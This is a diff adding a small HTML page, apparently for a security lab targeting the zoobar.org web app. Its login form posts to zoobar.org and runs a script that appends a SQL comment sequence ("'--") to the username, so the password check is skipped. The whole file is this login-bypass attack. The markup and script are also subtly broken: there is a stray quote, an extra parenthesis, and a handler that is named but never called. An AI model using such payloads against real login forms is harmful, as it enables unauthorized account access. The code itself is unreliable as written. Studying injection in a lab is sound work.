@@ -1,0 +1,17 @@
+<html>
+<head>
+</head>
+<body>
+	<form method="POST" name="loginform" onsubmit="sqlInjection" action="http://zoobar.org/index.php">
+		<input id=username" type="text" name="login_username" size=25 autocomplete=no />
+		<input type=hidden name=login_password value="null" />
+		<input type="submit" name="submit_registration" value="Login"/>
+	</form>
+	<script>
+		function sqlInjection(){
+			document.getElementById('username').value = document.getElementById('username').value + "'--");
+			return true;
+			}
+	</script>
+</body>
+</html>
